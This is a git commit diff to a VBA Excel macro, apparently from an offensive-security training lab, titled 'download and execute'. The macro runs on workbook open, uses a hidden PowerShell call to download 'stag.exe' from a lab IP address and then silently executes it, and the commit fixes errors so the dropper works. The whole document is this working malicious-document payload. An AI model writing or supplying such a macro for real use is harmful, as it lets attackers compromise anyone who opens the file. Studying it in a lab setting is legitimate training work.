7fbbe6a65ce58fb32086509b7ea59f3009378360
Emmanouil Perselis <okmanolos1@hotmail.com>
2020-12-06 14:06:59 +0100

    Update marcro_excel_download_and_execute.vb

--- module_3/marcro_excel_download_and_execute.vb
+++ module_3/marcro_excel_download_and_execute.vb
@@ -1,9 +1,10 @@
 Private Sub Workbook_Open()
     Dim exePath As String
-    exePath = ActiveDocument + "\stag.exe"
+    
     Dim str As String
-    str = "powershell (New-Object System.netWebClient).DownloadFile('http://192.168.49.71/stag.exe', 'stag.exe')"
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.71/stag.exe', 'C:\Users\Offsec\Desktop\stag.exe')"
     Shell str, vbHide
+    exePath = ActiveWorkbook.Path + "\stag.exe"
     Wait (2)
     Shell exePath, vbHide
 End Sub
